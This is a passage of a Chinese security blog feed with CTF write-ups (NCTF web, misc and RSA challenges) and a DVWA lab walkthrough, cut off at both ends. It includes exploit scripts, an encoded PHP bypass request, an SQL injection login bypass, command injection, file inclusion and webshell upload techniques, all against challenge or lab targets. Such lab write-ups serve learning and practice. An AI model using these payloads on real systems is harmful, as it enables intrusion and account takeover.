= $_SERVER['REMOTE_ADDR'];         }       $ip  = preg_match('/^([0-9]{1,3}\.){3}[0-9]{1,3}$/',$ip) ? $ip : 'Unknown';       // echo $ip;       return $ip;    }</code></pre><p>由此，取出来的是<code>HTTP_CLIENT_IP</code>,$seed也知道，就可以预测某秒钟产生的随机值(<code>mktime()</code>函数秒为单位),通过预测，然后用bp一直提交该预测出的随机值，服务器果然返回了great!！！<img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/bd6af7a4dfbe161064b93a9cb8f51187.png"></p><h2 id="全球最大交友网站"><a href="#全球最大交友网站" class="headerlink" title="全球最大交友网站"></a>全球最大交友网站</h2><hr><p>看到题目想到了应该是<code>.git</code>源码泄露，在题目连接后加上<code>/.git/HEAD</code>,证明的确存在<img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/89ae2a0035f5aa42c0f28caa9b47cf26.png"> 于是使用<code>GitHack</code>恢复源码，恢复出来的readme文件显示在tag1.0，于是使用<code>Git_Extract</code>将所有版本拖下来，得到flag<img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/4161a0fea063946d1fda174a186a33f1.png"></p><h2 id="小绿草之最强大脑"><a href="#小绿草之最强大脑" class="headerlink" title="小绿草之最强大脑"></a>小绿草之最强大脑</h2><hr><p>这个题竟然拿到了一血，也是很意外。可能大家都绕在了32位和64位的这个点上。打开题目，让自己设一个21位以上的数和网页上已经给出的算式相加，将自己设的数和计算后的答案通过post提交。<img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/8c668f827e02cc795ac5d8c56fa4d1e0.png"> html注释里写着源码泄露了解下，于是访问<code>index.php.bak</code>下载了源码如下：</p><pre class="language-none"><code class="language-none">&lt;?phpif(isset($_SESSION['ans']) &amp;&amp; isset($_POST['ans'])){if(($_SESSION['ans'])+intval($_POST['input'])!=$_POST['ans']){session_destroy();echo '&lt;script language="javascript"&gt;  alert("怎么没算对呢？");  window.history.back(-1);  &lt;/script&gt;';}else{if(intval(time())-$_SESSION['time']&lt;1){session_destroy();echo '&lt;script language="javascript"&gt;  alert("你手速太快啦，服务器承受不住!!!");  window.history.back(-1); &lt;/script&gt; ';}if(intval(time())-$_SESSION['time']&gt;2){session_destroy();echo '&lt;script language="javascript"&gt;  alert("你算的太慢了少年！");  window.history.back(-1); &lt;/script&gt; ';}echo '&lt;script language="javascript"&gt;  alert("tql，算对了！！");       &lt;/script&gt; ';$_SESSION['count']++;}}?&gt;</code></pre><p>注意到input值是经过intval转换的，而且有严格校验只能是纯数字，官方文档里面对intval函数有如下描述:<img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/e0512df51e526a37b3a9ce0fe54ef8b8.png"> 所以实际是将网页上的算式和32位或64位所能表示的最大的数进行相加，而提交的时候只需要input值为一个21位以上的数字字符串，脚本如下(得好好学正则了，每次都string[1:3]太真实了)：</p><pre class="language-none"><code class="language-none">#/usr/bin/python# -*- coding: utf-8 -*-import requestsimport timeimport reurl = 'http://ctfgame.acdxvfsvd.net:20004/index.php'def get(calu):    obj = ''    tmp = re.findall(r'&lt;div style="display:inline;"&gt;(.*?)&lt;/div&gt;',calu)    obj = obj.join(tmp)    obj = "9223372036854775807+"+obj[:-1]    time.sleep(1)    post(eval(obj))def post(ans):    post_data = {'input':123456789012345678902376575475476547547,'ans':ans}    print post_data    r = ss.post(url=url,data=post_data)    if 'nctf' in r.text:        print r.text        exit(0)    else:        get(r.content)ss=requests.session()r = ss.get(url)get(r.text)</code></pre><p>&nbsp; <img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/70d53c8bfed5a4dba14c02f47b3dbdde.png"></p><h2 id="easy-audit"><a href="#easy-audit" class="headerlink" title="easy_audit"></a>easy_audit</h2><hr><p>访问题目直接给出了源码。</p><pre class="language-none"><code class="language-none">&lt;?php highlight_file(__FILE__); error_reporting(0); if($_REQUEST){     foreach ($_REQUEST as $key =&gt; $value) {         if(preg_match('/[a-zA-Z]/i', $value))   die('waf..');     } } if($_SERVER){     if(preg_match('/yuligeflagnctf/i', $_SERVER['QUERY_STRING']))  die('waf..'); } if(isset($_GET['yulige'])){     if(!(substr($_GET['yulige'], 32) === md5($_GET['yulige']))){         //日爆md5!!!!!!         die('waf..');     }else{         if(preg_match('/nctfisfun$/', $_GET['nctf']) &amp;&amp; $_GET['nctf'] !== 'nctfisfun'){             $getflag = file_get_contents($_GET['flag']);         }         if(isset($getflag) &amp;&amp; $getflag === 'ccc_liubi'){             include 'flag.php';             echo $flag;         }else die('waf..');     } } ?&gt; </code></pre><p>中途遇到了很多问题，本地尝试了很多次，随后查看各个函数的php官方文档才找出最终的绕过方法，主要有以下几个点： 1.<code>request_order='GPC'</code>时 <code>$_REQUEST</code>会按照<code>($_COOKIE)&gt;$_POST&gt;$_GET</code>变量覆盖 也就是get方式传<code>nctf=1</code>和post方式传<code>nctf=2</code>在同时传递的时候，<code>$_REQUES</code>里<code>nctf=2</code> 2. <code>$_SERVER['QUERY_STRING']</code>这个变量是取得原始url查询串，并没有url解码，所以如果传<code>?nct%66=1&nbsp;</code> &nbsp; <code>$_SERVER['QUERY_STRING']</code>的值仍然是<code>nct%66=1</code> <a href="http://web.chacuo.net/charseturlencode">http://web.chacuo.net/charseturlencode</a>这个网站可以将普通字符url编码 3. Md5加密数组返回值为NULL，substr截取数组也会返回NULL 4. <code>preg_match('/nctfisfun$/)</code> 这个只需要是nctfisfun结尾就能满足 5. 最后的<code>file_get_contents($_GET['flag'])</code>，不能用原来的php://input，因为post有其他数据，所以用的<code>data://text/plain;base64,Y2NjX2xpdWJ</code> ，其中<code>Y2NjX2xpdWJ</code>即为ccc_liubi的base64编码(我在本地尝试过通过<code>http协议</code>获取远程内容为ccc_liubi的文件，可以getflag，然而题目地址不行)</p><pre class="language-none"><code class="language-none">payload数据包：POST /?%79%75%6c%69%67%65[]=1&amp;nct%66=1n%63%74%66%69%73%66%75%6e&amp;%66lag=data://text/plain;base64,Y2NjX2xpdWJp HTTP/1.1Host: ctfgame.acdxvfsvd.net:20007Content-Type: application/x-www-form-urlencodedContent-Length: 13nctf=1&amp;flag=1</code></pre><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/a6dd71fc0bf0ee02ead3530abc07cc7c.png"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><hr><h2 id="CalcNow："><a href="#CalcNow：" class="headerlink" title="CalcNow："></a>CalcNow：</h2><hr><p>连接上远程端口后，输入Team的token，会返回一个算式，需要在两秒内算好发送过去<img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/25299270bb4e12543cd81ab75ec9c838.png"> 使用zio模块，编写脚本 getflag</p><pre class="language-none"><code class="language-none">from zio import *r = zio(('47.110.195.228',30003))r.writeline('JWGthxProBatsx9WcOSJXvyIlndG6qQe')r.read_until('...\n')tmp = r.readline()tmp = tmp.replace(' add ','+').replace(' mul ','*').replace(' xor ','^').replace(' sub ','-')r.writeline(str(eval(tmp)))r.read()</code></pre><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/0133d7cf007aba81fe6088b1a3f14fd6.png"> &nbsp;</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><hr><h2 id="Easy-RSA"><a href="#Easy-RSA" class="headerlink" title="Easy RSA:"></a>Easy RSA:</h2><p>题目：</p><pre class="language-none"><code class="language-none">n = 24585768801100871989460458412563674690545986652089097718040761783186739174559136657307807040444318337561194142282186006216583089898423180103199568738639814413601595196467099996734334212909157604318709957690532885862891927163713619932622153281344607898846228206181834468325246573910857887714824338949742479585089251882243488454602710292507668577598274622372304293403731722318890268908300308478539449464617438721833942643889296634768118375076052778833640986893990732882252524850152650060780854621796349622086656401914022236044924841914313726991826438982902866584892213702893596657746111940812657202364588469026832387629p - q = 14048479366496281701869293063643750801596179514889914988732592464154208813942939793532694949932787548745769133200541469022315588864587160064703369956054828780928008235304461825448872454098086255531582368864754318040219023548966787642948010656526691472780392631956031751285174567712974691729142190835749586660e = 65537c = 13043206753625359891696429504613068427529111016070088678736297291041435652992434742862062899975037273524389833567258051170507686131853178642412748377655159798601888072877427570380109085131089494464136940524560062629558966202744902709909907514127527274581612606840291391818050072220256661680141666883565331886278443012064173917218991474525642412407692187407537171479651983318468186723172013439034765279464665108704671733067907815695414348312753594497823099115037082352616886076617491904991917443093071262488786475411319592529466108485884029307606114810451140886975584959872328937471166255190940884805476899976523580343</code></pre><p>的却是根据公式<code>n=pq</code>&nbsp; <code>p-q=14048...</code>列出一元二次方程组，解出<code>pq&nbsp;</code> 算出私钥<code>d</code>&nbsp; &nbsp;再用<code>d</code>解出明文 具体使用工具及方法，参考：<a href="https://blog.csdn.net/CosmopolitanMe/article/details/76321621">https://blog.csdn.net/CosmopolitanMe/article/details/76321621</a> 最后解出明文m:<code>m=45411192849370852342508097771685415309715836886014345394100707709</code> 再用BigIntergerCal转为十六进制转为字符得到flag:<code>nctf{my_M4th_1s_t00_b4d!!!}</code></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>漏洞验证系列</title>
      <link href="/2018/07/23/lou-dong-yan-zheng-xi-lie/"/>
      <url>/2018/07/23/lou-dong-yan-zheng-xi-lie/</url>
      
        <content type="html"><![CDATA[<ol><li><h4 id="HTTP-TRACE-TRACK-Methods-Allowed"><a href="#HTTP-TRACE-TRACK-Methods-Allowed" class="headerlink" title="HTTP&nbsp;TRACE&nbsp;/&nbsp;TRACK&nbsp;Methods&nbsp;Allowed"></a><em>HTTP</em>&nbsp;<em>TRACE</em>&nbsp;<em>/</em>&nbsp;<em>TRACK</em>&nbsp;<em>Methods</em>&nbsp;<em>Allowed</em></h4> 该漏洞是服务器开启了HTTP TRACE方法，该方法用于调试HTTP。可以结合xss漏洞形成XST攻击（主要是为了获取到被HTTP ONLY标识的COOKIE）如下图：<img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/B16E3F15-D9B5-436C-9A0E-D8EB44DCC744.jpg"> 漏洞利用xss代码： var xmlHttp = new XMLHttpRequest(); xmlHttp.open(“GET”,”<a href="http://xrone.cn/&quot;,false">http://xrone.cn/",false</a>); xmlHttp.send(); xmlDoc = xmlHttp.responseText; alert(xmlDoc);</li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DVWA完整通关记录</title>
      <link href="/2018/07/09/dvwa-wan-zheng-tong-guan-ji-lu/"/>
      <url>/2018/07/09/dvwa-wan-zheng-tong-guan-ji-lu/</url>
      
        <content type="html"><![CDATA[<p>&nbsp;</p><p>DVWA完整测评</p><h1 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h1><h2 id="1-1-系统环境："><a href="#1-1-系统环境：" class="headerlink" title="1.1. 系统环境："></a>1.1. 系统环境：</h2><p>使用MAMP集成包搭建Apache+MySql+PHP环境:</p><p>Apache: Apache/2.4.33 (Unix)</p><p>Mysql:5.6.38</p><p>PHP:5.6.32</p><h2 id="1-2-部署web系统："><a href="#1-2-部署web系统：" class="headerlink" title="1.2. 部署web系统："></a>1.2. 部署web系统：</h2><p>官网下载dvwa压缩包，解压到web目录下，修改config.inc.php文件，配置数据库账户、密码和安全等级，安装dvwa。</p><h1 id="2-Brute-Force-暴力破解"><a href="#2-Brute-Force-暴力破解" class="headerlink" title="2. Brute Force(暴力破解)"></a>2. Brute Force(暴力破解)</h1><h2 id="2-1-安全等级：LOW"><a href="#2-1-安全等级：LOW" class="headerlink" title="2.1. 安全等级：LOW"></a>2.1. 安全等级：LOW</h2><p>功能演示：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.001.png"></p><p>使用burpsuit拦截观察：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.002.png"></p><h3 id="2-1-1-思路1："><a href="#2-1-1-思路1：" class="headerlink" title="2.1.1. 思路1："></a>2.1.1. 思路1：</h3><p>该功能直接使用get方式传值登录，没有设置校验码，唯一token等校验方式，可以直接使用burpsuit的intruder模块进行暴力破解。截图如下。</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.003.png"></p><p>设置抓取成功登录时的Welcome字段，作为标记密码是否正确，也可以用返回包长度做判断。</p><h3 id="2-1-2-思路2："><a href="#2-1-2-思路2：" class="headerlink" title="2.1.2. 思路2："></a>2.1.2. 思路2：</h3><p>查看过源代码后，除了md5进行了加密，没有进行任何过滤，故可以使用sql注入绕过，如下图：<strong>username:admin’–%20</strong></p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.004.png"></p><h2 id="2-2-安全等级：MEDIUM"><a href="#2-2-安全等级：MEDIUM" class="headerlink" title="2.2. 安全等级：MEDIUM"></a>2.2. 安全等级：MEDIUM</h2><p>相比LOW等级，MEDIUM加入了**mysqli_real_escape_string()**函数，防止sql注入。密码输入错误时加入了sleep(2)延迟返回时间，降低爆破效率及准确度。</p><h3 id="2-2-1-思路1："><a href="#2-2-1-思路1：" class="headerlink" title="2.2.1. 思路1："></a>2.2.1. 思路1：</h3><p>可以使用Python脚本实现暴力破解，控制超时时间，提高爆破效率。</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.005.png"></p><h2 id="2-3-安全等级：HIGH"><a href="#2-3-安全等级：HIGH" class="headerlink" title="2.3. 安全等级：HIGH"></a>2.3. 安全等级：HIGH</h2><p>依然通过抓包分析，表单设置有掩藏token，提交的时候需要提交有效的token。</p><h3 id="2-3-1-思路1："><a href="#2-3-1-思路1：" class="headerlink" title="2.3.1. 思路1："></a>2.3.1. 思路1：</h3><p>爆破方法：每次进入登录页面，服务器会返回一个随机的user_token隐藏域，随表单一起提交上去。服务器校验token是否有效，如果无效，执行302跳转，若是有效，执行登录功能。只需要在中级安全等级的脚本功能上稍作改动就可以实现爆破，在每次发送登录请求前，先去获取一个新的token值，随登录请求一起提交即可绕过token验证。</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.006.png"></p><h2 id="2-4-安全等级：impossible"><a href="#2-4-安全等级：impossible" class="headerlink" title="2.4. 安全等级：impossible"></a>2.4. 安全等级：impossible</h2><p>同样的一波抓包，这个安全度的登录改为使用POST方法，加隐藏token域，但使用脚本只需要改改发送方法即可绕过。但是密码会被锁定15分钟，漏洞无法利用。如图：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.007.png"></p><h1 id="3-Command-Injection-命令注入"><a href="#3-Command-Injection-命令注入" class="headerlink" title="3. Command Injection(命令注入)"></a>3. Command Injection(命令注入)</h1><h2 id="3-1-安全等级：LOW"><a href="#3-1-安全等级：LOW" class="headerlink" title="3.1. 安全等级：LOW"></a>3.1. 安全等级：LOW</h2><p>功能演示：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.008.png"></p><p>使用burpsuit拦截观察：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.009.png"></p><h3 id="3-1-1-思路1："><a href="#3-1-1-思路1：" class="headerlink" title="3.1.1. 思路1："></a>3.1.1. 思路1：</h3><p>该功能直接将用户输入值不加过滤的放入cmd或shell中执行，所以可以远程执行任意命令。截图如下：</p><p>系统执行完ping命令后执行了pwd命令并输出</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.010.png"></p><h2 id="3-2-安全等级：MEDIUM"><a href="#3-2-安全等级：MEDIUM" class="headerlink" title="3.2. 安全等级：MEDIUM"></a>3.2. 安全等级：MEDIUM</h2><h3 id="3-2-1-思路1："><a href="#3-2-1-思路1：" class="headerlink" title="3.2.1. 思路1："></a>3.2.1. 思路1：</h3><p>相比LOW等级，MEDIUM等级替换掉了&amp;&amp;和”;”符号，可以时候符号，故意将ip字段填错即可，截图如下：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.011.png"></p><h2 id="3-3-安全等级：HIGH"><a href="#3-3-安全等级：HIGH" class="headerlink" title="3.3. 安全等级：HIGH"></a>3.3. 安全等级：HIGH</h2><p>完善了黑名单，但仍然存在漏网之鱼</p><h3 id="3-3-1-思路1："><a href="#3-3-1-思路1：" class="headerlink" title="3.3.1. 思路1："></a>3.3.1. 思路1：</h3><p>过滤了” ”但是可以使用管道执行后面的命令，如图；</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.012.png"></p><h2 id="3-4-安全等级：impossible"><a href="#3-4-安全等级：impossible" class="headerlink" title="3.4. 安全等级：impossible"></a>3.4. 安全等级：impossible</h2><p>同样的一波抓包，表单加了隐藏token。后台代码按ipv4地址手动重排，无法注入。如图：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.013.png"></p><h1 id="4-Cross-Site-Request-Forgery-CSRF-跨站请求"><a href="#4-Cross-Site-Request-Forgery-CSRF-跨站请求" class="headerlink" title="4. Cross Site Request Forgery (CSRF) (跨站请求)"></a>4. Cross Site Request Forgery (CSRF) (跨站请求)</h1><h2 id="4-1-安全等级：LOW"><a href="#4-1-安全等级：LOW" class="headerlink" title="4.1. 安全等级：LOW"></a>4.1. 安全等级：LOW</h2><p>功能演示：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.014.png"></p><p>使用burpsuit拦截观察：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.015.png"></p><h3 id="4-1-1-思路1："><a href="#4-1-1-思路1：" class="headerlink" title="4.1.1. 思路1："></a>4.1.1. 思路1：</h3><p>该功能直接使用get方式传值登录，没有设置校验码，唯一token等校验方式，可以直接使用burpsuit生成CSRF POC代码，如图</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.016.png"></p><p>点击Test in browser复制地址，浏览器中打开，点击提交，成功更改密码。</p><h2 id="4-2-安全等级：MEDIUM"><a href="#4-2-安全等级：MEDIUM" class="headerlink" title="4.2. 安全等级：MEDIUM"></a>4.2. 安全等级：MEDIUM</h2><p>MEDIUM加入了校验Referer，不过是校验Referer中是否有$_SERVER[ ‘SERVER_NAME’ ]的值，通过构造访问的url中包含关键词，即可绕过REFERER验证。</p><h3 id="4-2-1-思路1："><a href="#4-2-1-思路1：" class="headerlink" title="4.2.1. 思路1："></a>4.2.1. 思路1：</h3><p>设置目录命名为localhost，绕过REFERER验证成功：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.017.png"></p><h2 id="4-3-安全等级：HIGH"><a href="#4-3-安全等级：HIGH" class="headerlink" title="4.3. 安全等级：HIGH"></a>4.3. 安全等级：HIGH</h2><p>依然通过抓包分析，表单设置有掩藏token，且提交时需要提交有效的token。</p><h3 id="4-3-1-思路1："><a href="#4-3-1-思路1：" class="headerlink" title="4.3.1. 思路1："></a>4.3.1. 思路1：</h3><p>由于浏览器跨域请求问题，单一的CSRF攻击无法成功获取到token，需结合XSS攻击获取到token，再进行CSRF攻击。Xss页面植入代码如下：<img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.018.png"></p><p>当访问xss页面时，会嵌入一个iframe 获取用户csrf页面的token，自动打开并传递给另一个网站，执行csrf攻击,拿到token</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.019.png"></p><p>攻击成功：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.020.png"></p><h2 id="4-4-安全等级：impossible"><a href="#4-4-安全等级：impossible" class="headerlink" title="4.4. 安全等级：impossible"></a>4.4. 安全等级：impossible</h2><p>IMPOSSIBLE等级难度需要输入用户原密码，以及校验token。在不知道用户原密码的情况下无法发起CSRF攻击。<img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.021.png"></p><h1 id="5-File-Inclusion-文件包含"><a href="#5-File-Inclusion-文件包含" class="headerlink" title="5. File Inclusion (文件包含)"></a>5. File Inclusion (文件包含)</h1><h2 id="5-1-安全等级：LOW"><a href="#5-1-安全等级：LOW" class="headerlink" title="5.1. 安全等级：LOW"></a>5.1. 安全等级：LOW</h2><p>功能演示：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.022.png"></p><p>使用page参数控制包含的文件名，由于没有任何过滤，可以包含任意文件（开启allow_url_influde和allow_url_fopen时可引入互联网文件。）</p><h3 id="5-1-1-思路1："><a href="#5-1-1-思路1：" class="headerlink" title="5.1.1. 思路1："></a>5.1.1. 思路1：</h3><p>包含的脚本文件不需要验证后缀名，只需要有脚本代码在文本中就能够执行，可以使用图片马等,截图如下；</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.023.png"></p><h3 id="5-1-2-思路2："><a href="#5-1-2-思路2：" class="headerlink" title="5.1.2. 思路2："></a>5.1.2. 思路2：</h3><p>没有开启allow_url_include和allow_url_fopen时，若是有上传图片功能，可以利用图片马。或者发起一个get请求，包含要执行的命令，这个命令会被记录在access_log文件里面，再将access_log文件包含也会使代码执行。</p><h2 id="5-2-安全等级：MEDIUM"><a href="#5-2-安全等级：MEDIUM" class="headerlink" title="5.2. 安全等级：MEDIUM"></a>5.2. 安全等级：MEDIUM</h2><h3 id="5-2-1-思路1："><a href="#5-2-1-思路1：" class="headerlink" title="5.2.1. 思路1："></a>5.2.1. 思路1：</h3><p>相比LOW等级，MEDIUM等级过滤了http和https协议，同时过滤了../和..\。若是未开启allow_url_include和allow_url_fopen，可以使用 ….//绕过(或者使用绝对路径)，截图如下：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.024.png"></p><h2 id="5-3-安全等级：HIGH"><a href="#5-3-安全等级：HIGH" class="headerlink" title="5.3. 安全等级：HIGH"></a>5.3. 安全等级：HIGH</h2><p>匹配传入的参数是否匹配文件名规则file* 或者include.php</p><h3 id="5-3-1-思路1："><a href="#5-3-1-思路1：" class="headerlink" title="5.3.1. 思路1："></a>5.3.1. 思路1：</h3><p>由于恰好可以利用file://协议，所以可以轻松包含本地文件如图；</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.025.png"></p><h2 id="5-4-安全等级：impossible"><a href="#5-4-安全等级：impossible" class="headerlink" title="5.4. 安全等级：impossible"></a>5.4. 安全等级：impossible</h2><p>设定了可包含的文件名白名单，无法利用文件包含漏洞。</p><h1 id="6-File-Upload-文件上传"><a href="#6-File-Upload-文件上传" class="headerlink" title="6. File Upload (文件上传)"></a>6. File Upload (文件上传)</h1><h2 id="6-1-安全等级：LOW"><a href="#6-1-安全等级：LOW" class="headerlink" title="6.1. 安全等级：LOW"></a>6.1. 安全等级：LOW</h2><p>功能演示：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.026.png"></p><h3 id="6-1-1-思路1："><a href="#6-1-1-思路1：" class="headerlink" title="6.1.1. 思路1："></a>6.1.1. 思路1：</h3><p>上传的文件未做任何校验，可直接上传php马等,截图如下；</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.027.png"></p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.028.png"></p><h2 id="6-2-安全等级：MEDIUM"><a href="#6-2-安全等级：MEDIUM" class="headerlink" title="6.2. 安全等级：MEDIUM"></a>6.2. 安全等级：MEDIUM</h2><h3 id="6-2-1-思路1："><a href="#6-2-1-思路1：" class="headerlink" title="6.2.1. 思路1："></a>6.2.1. 思路1：</h3><p>相比LOW等级，MEDIUM等级校验了Content-Type值，文件后缀名并没有校验或重命名。使用burpsuit拦截更改Content-Type绕过。截图如下：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.029.png"></p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.030.png"></p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.031.png"></p><h3 id="6-2-2-思路2："><a href="#6-2-2-思路2：" class="headerlink" title="6.2.2. 思路2："></a>6.2.2. 思路2：</h3><p>这里可以使用文件包含漏洞，上传包含php代码的图片到服务器，使用文件包含漏洞执行恶意代码。</p><h3 id="6-2-3-思路3："><a href="#6-2-3-思路3：" class="headerlink" title="6.2.3. 思路3："></a>6.2.3. 思路3：</h3><p>若是Magic_quote_gpc为off，则可以利用%00截断(burpsuit拦截修改)hack.php%00.png。</p><h2 id="6-3-安全等级：HIGH"><a href="#6-3-安全等级：HIGH" class="headerlink" title="6.3. 安全等级：HIGH"></a>6.3. 安全等级：HIGH</h2><p>后缀名使用查找最后一个小数点之后字符串的方法取出，再进行白名单校验。</p><h3 id="6-3-1-思路1："><a href="#6-3-1-思路1：" class="headerlink" title="6.3.1. 思路1："></a>6.3.1. 思路1：</h3><p>但是没有对文件内容进行过滤审查，已然结合文件包含漏洞，成功实现文件上传漏洞攻击，截图如下：</p><p>上传一张正常图片，拦截并只修改文件内容为php代码。</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.032.png"></p><p>上传成功后结合文件包含漏洞,成功执行：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.033.png"></p><h2 id="6-4-安全等级：impossible"><a href="#6-4-安全等级：impossible" class="headerlink" title="6.4. 安全等级：impossible"></a>6.4. 安全等级：impossible</h2><p>本级别对文件名进行重置,对图像进行重绘，去除php代码，无法利用。</p><h1 id="7-Insecure-CAPTCHA-不安全的验证机制"><a href="#7-Insecure-CAPTCHA-不安全的验证机制" class="headerlink" title="7. Insecure CAPTCHA (不安全的验证机制)"></a>7. Insecure CAPTCHA (不安全的验证机制)</h1><h2 id="7-1-安全等级：LOW"><a href="#7-1-安全等级：LOW" class="headerlink" title="7.1. 安全等级：LOW"></a>7.1. 安全等级：LOW</h2><p>功能演示：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.034.png"></p><h3 id="7-1-1-思路1："><a href="#7-1-1-思路1：" class="headerlink" title="7.1.1. 思路1："></a>7.1.1. 思路1：</h3><p>密码修改功能分为step1和step2,通过拦截数据包修改step参数，绕过验证码检查，截图如下；</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.035.png"></p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.036.png"></p><h2 